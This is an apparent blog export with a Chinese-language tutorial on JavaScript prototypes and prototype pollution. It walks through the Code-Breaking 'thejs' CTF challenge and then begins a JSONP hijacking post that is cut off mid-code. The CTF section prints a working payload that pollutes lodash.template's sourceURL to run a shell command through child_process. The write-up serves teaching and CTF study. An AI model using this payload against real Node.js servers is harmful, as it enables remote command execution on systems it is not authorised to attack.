    <title>Prototype Pollution Attack</title>
    <url>/2019/09/25/Prototype-Pollution-Attack/</url>
    <content><![CDATA[<h3 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h3><h4 id="javascript对象"><a href="#javascript对象" class="headerlink" title="javascript对象"></a>javascript对象</h4><p>在Javascript中同样是有一切皆对象这种说法的，下面是在javascript中创建对象的三种方式</p>
<a id="more"></a>

<ul>
<li>普通创建</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">name</span>:<span class="string">'lihuaiqiu'</span>,<span class="string">'age'</span>,<span class="string">'19'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person=&#123;&#125;  <span class="comment">//创建空对象</span></span><br></pre></td></tr></table></figure>

<ul>
<li>构造函数方法创建</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name=<span class="string">"liahuqiu"</span>;</span><br><span class="line">    <span class="keyword">this</span>.test=<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">23333</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">person.prototype.a=<span class="number">3</span>;</span><br><span class="line">web=<span class="keyword">new</span> person();</span><br><span class="line"><span class="built_in">console</span>.log(web.test());</span><br><span class="line"><span class="built_in">console</span>.log(web.a)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过object创建</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">a.c=<span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(a.c)</span><br></pre></td></tr></table></figure>

<h4 id="函数即对象思想"><a href="#函数即对象思想" class="headerlink" title="函数即对象思想"></a>函数即对象思想</h4><p>这里用instanceof来判断很明显，首先用较为官方的语言来说明一下instanceof</p>
<blockquote>
<p>instanceof运算符可以用来判断某个构造函数的prototype属性是否存在另外一个要检测对象的原型链</p>
</blockquote>
<p>就像这样</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">My</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">You</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">     </span><br><span class="line"><span class="keyword">var</span> myOne = <span class="keyword">new</span> My();</span><br><span class="line"><span class="built_in">console</span>.info(myOne <span class="keyword">instanceof</span> My)<span class="comment">//true //myone.__proto__===My.prototype</span></span><br><span class="line"><span class="built_in">console</span>.info(myOne <span class="keyword">instanceof</span> You)<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>那么就可以通过下面这样的代码去验证函数即对象了</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nRFnk8.png" alt="nRFnk8.png"></p>
<p>由此可以test构造函数其实也是一种对象，即”函数即对象”。</p>
<p>那么函数与对象的属性有什么区别呢？csdn上有一个很好的图可以解释这个问题，如下:</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nRFRhD.png" alt="nRFRhD.png"></p>
<p>函数既可作为对象去解释又可作为函数去解释。</p>
<h4 id="proto-，constructor与prototype"><a href="#proto-，constructor与prototype" class="headerlink" title="__proto__，constructor与prototype"></a>__proto__，constructor与prototype</h4><p>首先把这三个属性的基本概念列举出来</p>
<ul>
<li><p>__proto__： <em>\</em>proto__是对象与对象之间连接的桥梁，即原型链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对象.__proto__&#x3D;构造器(构造函数).prototype</span><br></pre></td></tr></table></figure>

<p>构造器.prototype其实也是一个对象，为构造函数的原型对象，同样有__proto__属性，一直通过原型链__proto__最终可找到null。</p>
<p>在访问一个对象的某个属性时,当属性在实例中找不到，就会在属性中的原型对象中寻找。</p>
</li>
<li><p>prototype：prototype为函数特有的属性，而通过构造函数实例化的对象，默认是没有的。</p>
</li>
</ul>
<p>构造函数.prototype即为此构造函数实例化的原型对象，即 构造器(构造函数).prototype=对象.<em>_proto_\</em></p>
<p>其实prototype主要作用为解决构造函数的对象实例之间无法共享属性的缺点,实例如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">test.prototype.a=<span class="function"><span class="keyword">function</span> <span class="title">num</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">&#125;</span><br><span class="line">example1=<span class="keyword">new</span> test();</span><br><span class="line">example2=<span class="keyword">new</span> test();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(example1.a);   <span class="comment">//[Function: num]</span></span><br><span class="line"><span class="built_in">console</span>.log(example2.a)    <span class="comment">//[Function: num]</span></span><br><span class="line"><span class="built_in">console</span>.log(example1.a===example2.a);   <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>constructor：通过实例化对象.constructor即可得到该实例化对象的构造函数，实例如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="built_in">console</span>.log(person1.constructor) <span class="comment">//[Function: Person]</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.constructor) <span class="comment">//[Function: Person] //Person的原型对象的构造函数即为Person</span></span><br></pre></td></tr></table></figure>

<p>之前介绍的函数即对象思想在这里就可以解释一些代码了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Person.constructor) <span class="comment">// [Function: Function]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span>.constructor) <span class="comment">// [Function: Function]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.constructor) <span class="comment">// [Function: Function]</span></span><br></pre></td></tr></table></figure>

<p>这四行代码说明了以下几点问题</p>
<ol>
<li>Funtion函数为Person函数的构造函数，这里就间接说明了函数即对象这个思想</li>
<li>Function函数同时也是自己的构造函数</li>
<li>Function函数同时为Object内置类的构造函数</li>
</ol>
<p><strong>所以，javascript中任意函数都是函数Function的实例对象，同时Function函数自身也为自己的实例对象</strong></p>
<h4 id="一些帮助理解的小例子"><a href="#一些帮助理解的小例子" class="headerlink" title="一些帮助理解的小例子"></a>一些帮助理解的小例子</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="built_in">console</span>.log(person1.constructor) <span class="comment">//[Function: Person]</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.constructor) <span class="comment">//[Function: Person]</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__===Person.prototype)</span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__.__proto__.constructor) <span class="comment">//[Function: Object]</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__.__proto__==<span class="built_in">Object</span>.prototype) <span class="comment">//&#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__.__proto__.__proto__)  <span class="comment">//null</span></span><br></pre></td></tr></table></figure>

<p>来自csdn上的一个很棒的图片</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nfdXRK.png" alt="nfdXRK.png"></p>
<h4 id="Object与Function"><a href="#Object与Function" class="headerlink" title="Object与Function"></a>Object与Function</h4><p><code>Object</code>/<code>Function</code>既是对象，有自己的方法和属性，也是函数，可以作为构造函数，或许可以称作所谓的构造函数(函数对象)</p>
<h5 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h5><p>Function相对来说是一个很特别的函数/对象</p>
<ul>
<li>一般函数函数的prototype属性为一个原型对象，而Function的prototype属性为一个函数对象</li>
<li>所有函数的本身的__proto__属性指向Function的原型对象，实例如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Person.__proto__===<span class="built_in">Function</span>.prototype)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.__proto__===<span class="built_in">Function</span>.prototype)</span><br></pre></td></tr></table></figure>

<h5 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h5><ul>
<li>Object.prototype为所有对象原型链的终点且Object.prototype.__proto__为null</li>
</ul>
<p>一些帮助理解的小例子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.__proto__ === <span class="built_in">Function</span>.prototype <span class="comment">// true </span></span><br><span class="line"><span class="built_in">Object</span>.__proto__ === <span class="built_in">Function</span>.prototype <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span> <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.__proto__ === <span class="built_in">Object</span>.prototype <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype === <span class="built_in">Object</span>.__proto__ <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype) <span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.__proto__) <span class="comment">// [Function]</span></span><br></pre></td></tr></table></figure>

<h4 id="普通对象与函数对象的一些区别"><a href="#普通对象与函数对象的一些区别" class="headerlink" title="普通对象与函数对象的一些区别"></a>普通对象与函数对象的一些区别</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> test=&#123;<span class="string">'name'</span>:<span class="string">'lihuaiqiu'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test.__proto__===<span class="built_in">Object</span>.prototype)</span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.__proto__===<span class="built_in">Object</span>.prototype)</span><br></pre></td></tr></table></figure>

<p>从上例中可明显看出函数对象与普通对象的区别是中间差了一个prototype获取原型对象的过程。</p>
<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>污染实例如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> test1=&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;</span><br><span class="line">test1.__proto__.c=<span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(test1.c) <span class="comment">//3</span></span><br><span class="line"><span class="keyword">var</span> test2=&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test2.a) <span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(test2.c) <span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p>在上面的代码中我们并没有在test2对象中设置c变量，但是却成功的打印出了c这是为什么呢？</p>
<p>因为我们在test1.__proto__中也就是object.prototype(<strong>Object构造函数的原型链</strong>)中设置了c,那么访问test2.c的时候首先在这个对象中找不到，再去test2.__proto__去找(也就是<strong>Object构造函数的原型链</strong>中去找)，正好找到c变量即可正常数据，这个访问流程也就是对JS原型链的诠释，下面我们具体打印一下Object来看一下</p>
<p><a href="https://imgchr.com/i/nfH5hq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/16/nfH5hq.png" alt="nfH5hq.png"></a></p>
<h3 id="原型链污染应用场景"><a href="#原型链污染应用场景" class="headerlink" title="原型链污染应用场景"></a>原型链污染应用场景</h3><p>这里用的是ph牛给的例子，在ph牛的文章中，有以下两个场景可能产生原型链污染</p>
<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<p>示例代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>这里本来的想法是通过o1.__proto__去操控Object.prototype进而污染o3，但是这个o2中的proto并没有被当作键值，可以打断点看一下</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhtCr9.png" alt="nhtCr9.png"></p>
<p>这个__proto__其实已经被当作原型对象了，不过在看这个的时候我发现o2其实也是有点意思的，实验如下：</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhd2fx.png" alt="nhd2fx.png"></p>
<p>这里我们可以看到其实这个a中设置的”键值”已经被当作了a的原型对象了，相当于我们自己定义的原型对象，正常情况下a.__proto__就可以去操作Object.prototype了，但是这里是需要两次__proto__的，我们来看一下正常键值下我们通过__proto__来操控Object.prototype的亚子</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhBkOU.png" alt="nhBkOU.png"></p>
<p>这样就很清晰的明白了在__proto__键值下为什么要通过两次__proto__才能去操作Object.prototype</p>
<p>所以在ph牛给的例子中我们的键值相当于自定义了一个原型对象，故没法在新的对象中添加__proto__键值，所以就没法进行原型链污染了。那么怎么才能进行原型链污染呢，ph牛同样给出了例子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>跟进分析一下</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhD33q.png" alt="nhD33q.png"></p>
<p>从上图我们可以看出来在merge之后成功触发原型链污染，成功修改Object.prototype造成对o3的污染。</p>
<p>那么我们可以清楚在JSON解析的情况下__proto__是会被当作键名的，而不再是类似之前那样被当作自己声明的原型了。</p>
<h3 id="Code-Breaking-Thejs"><a href="#Code-Breaking-Thejs" class="headerlink" title="Code-Breaking Thejs"></a>Code-Breaking Thejs</h3><p>主要部分代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json()) <span class="comment">//处理JSON数据</span></span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span>     <span class="comment">//设置一下Session</span></span><br><span class="line">&#125;))</span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err)) <span class="comment">//调用ejs进行渲染</span></span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content) <span class="comment">//渲染内容</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;) <span class="comment">//动态引入成员变量</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered) <span class="comment">//传回来</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;    <span class="comment">//将body中的数据传入sessioN中</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">    language: data.language, </span><br><span class="line">    category: data.category <span class="comment">//渲染自己的选择</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(Example app listening on port <span class="number">3000</span>!))</span><br></pre></td></tr></table></figure>

<h4 id="程序主要逻辑分析"><a href="#程序主要逻辑分析" class="headerlink" title="程序主要逻辑分析"></a>程序主要逻辑分析</h4><p>我们通过两个选择框选择后这个框架会发生什么</p>
<p>首先判断请求方式是POST，然后进行下一步，通过lodash.merge，将我们body中的数值给data,然后session中储存这个data，这里也大概跟了一下lodash.merge，其原理应该就是正常的merge。</p>
<p>赋值完了之后进行渲染index,在渲染的适合，会跳到下面这个函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">  app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">  	<span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">    <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>也就是说这个才是渲染的核心，首先读取index.ejs的内容作为content,然后传入template模板化，最后进行动态引入一些配置变量，我们可以把compiled和options截出来具体看一下</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nTBWLt.png" alt="nTBWLt.png"></p>
<p>这样我们的rendered的值就是渲染后的界面了，最后callback返回给用户。</p>
<h4 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h4><h5 id="原型链污染点"><a href="#原型链污染点" class="headerlink" title="原型链污染点"></a>原型链污染点</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">    language: data.language, </span><br><span class="line">    category: data.category</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>在上面也说过原型链污染一般会出现在merge和clone中，那么这里的merge正好可以去触发原型链污染，而且req.body还是我们自行控制的，那么就可以造成原型链污染了</p>
<h5 id="漏洞点触发"><a href="#漏洞点触发" class="headerlink" title="漏洞点触发"></a>漏洞点触发</h5><p>这个漏洞触发倒是很仔细的分析了一波，分析了一下，也发现了一些很有意思的点。这里详细的记录分析一哈</p>
<p>正常的访问流程依然没变，先是把body中的数据传递到session中的data，然后渲染index页面，那么原型链污染的点是在data，我们下面就来仔细分析一下index的漏洞触发问题，首先跟进template函数，这个函数就是触发的关键了，因为后面的句子就是动态引入变量了，我们在template函数中需要找到一个未经过定义的变量这样才能通过这个变量拿到污染的值，这个变量就是sourceURL</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'//# sourceURL='</span> +</span><br><span class="line">  (<span class="string">'sourceURL'</span> <span class="keyword">in</span> options</span><br><span class="line">    ? options.sourceURL</span><br><span class="line">    : (<span class="string">'lodash.templateSources['</span> + (++templateCounter) + <span class="string">']'</span>)</span><br><span class="line">  ) + <span class="string">'\n'</span>;</span><br></pre></td></tr></table></figure>

<p>在正常传递payload的情况下我们可以去看一些sourceURL的值</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nHXw0s.png" alt="nHXw0s.png"></p>
<p>这就说明了options.sourceURL的值是未定义的，这就符合我们所需要的未定义的变量了，那么sourceURL在原型链污染的情况下最终的值就是我们的污染语句了，那么下面就接着跟一下这个template吧，最后template函数返回的变量是result，那么我们来看一下result的定义</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">    .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>通过Function匿名函数，importsValues以数组形式代表参数</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nbS1Rx.png" alt="nbS1Rx.png"></p>
<p>那么在原型链污染的情况下我们就可以控制sourceURL,提前return我们想要的污染语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\r\nreturn e &#x3D; () &#x3D;&gt; &#123;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()&#125;\r\n</span><br></pre></td></tr></table></figure>

<p>这里通过\r\n来逃避之前的注释，至于这里为什么要return一个匿名函数，之后会有一个解释，那么就继续跟进，将result返回给我们的compiled，再通过这个compiled去动态引入一些配置变量</p>
<p>不过这里有一个很有意思的地方，污染情况下和没污染的compiled的值对比如下</p>
<p>污染后</p>
<p><a href="https://imgchr.com/i/nbpfBD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/18/nbpfBD.png" alt="nbpfBD.png"></a></p>
<p>污染前</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nbpbgP.png" alt="nbpbgP.png"></p>
<p>从这两处对比来看其实我们可以发现命令执行应该是在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let rendered &#x3D; compied(&#123;...options&#125;)</span><br></pre></td></tr></table></figure>

<p>这里进行执行的，而且compiled在两处分别是对象函数与匿名函数，这里我有一个推测，就是必须要通过函数的形式来引入这些配置变量，这也就是为什么我们污染语句不是函数的话他就会报错的原因了，这里匿名函数执行到导致后面的源码无法渲染回来，所以我们原型链污染后他返回来的代码是我们命令执行的结果，并且没有一点之前的源码，最终得到 了我们的结果</p>
<p>PS：如果不是单独docker靶机的话，最好加个循环把污染的环境变量删掉，防止你的flag泄露</p>
<p>最后效果</p>
<p><a href="https://imgchr.com/i/nb9BKf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/18/nb9BKf.png" alt="nb9BKf.png"></a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://juejin.im/post/5b3798f851882574c105c51c" target="_blank" rel="noopener">https://juejin.im/post/5b3798f851882574c105c51c</a></p>
<p><a href="https://juejin.im/post/5b3dd222e51d4519226f204d" target="_blank" rel="noopener">https://juejin.im/post/5b3dd222e51d4519226f204d</a></p>
<p><a href="https://juejin.im/post/5cc99fdfe51d453b440236c3" target="_blank" rel="noopener">https://juejin.im/post/5cc99fdfe51d453b440236c3</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
<p><a href="https://paper.seebug.org/755/#hard-thejs" target="_blank" rel="noopener">https://paper.seebug.org/755/#hard-thejs</a></p>
<p><a href="https://blog.csdn.net/cc18868876837/article/details/81211729" target="_blank" rel="noopener">https://blog.csdn.net/cc18868876837/article/details/81211729</a></p>
<p><a href="https://blog.csdn.net/ylwdi/article/details/82805255" target="_blank" rel="noopener">https://blog.csdn.net/ylwdi/article/details/82805255</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JSONP劫持</title>
    <url>/2019/07/20/JSONP%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h3 id="JSONP跨域"><a href="#JSONP跨域" class="headerlink" title="JSONP跨域"></a>JSONP跨域</h3><p>主要介绍下JSONP，JSONP跨域巧妙的利用了script标签能跨域的特点,实现了json的跨域传输。</p>
<a id="more"></a>

<h4 id="JSONP原型理解"><a href="#JSONP原型理解" class="headerlink" title="JSONP原型理解"></a>JSONP原型理解</h4><p>test.html</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="comment">//回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    alert(data.message);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">" src="</span>http:<span class="comment">//120.77.174.89:10080/test.js"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>test.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">callback(&#123;message:&quot;success&quot;&#125;);</span><br></pre></td></tr></table></figure>

<p>访问test.html</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvOsPJ.png" alt="ZvOsPJ.png"></p>
<p><strong>上述形式也就是JSONP的原型，通过调用回调函数来返回所需要的数据。将JSON数据填充进回调函数，也就是JSONP—–JSON+Padding。</strong></p>
<p>来看一下比较官方的JSONP跨域代码—–Google的Ajax搜索方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="comment">//添加&lt;script&gt;标签的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addScriptTag</span>(<span class="params">src</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.setAttribute(<span class="string">"type"</span>,<span class="string">"text/javascript"</span>);</span><br><span class="line">        script.src = src;</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//搜索apple，将自定义的回调函数名result传入callback参数中</span></span><br><span class="line">    addScriptTag(<span 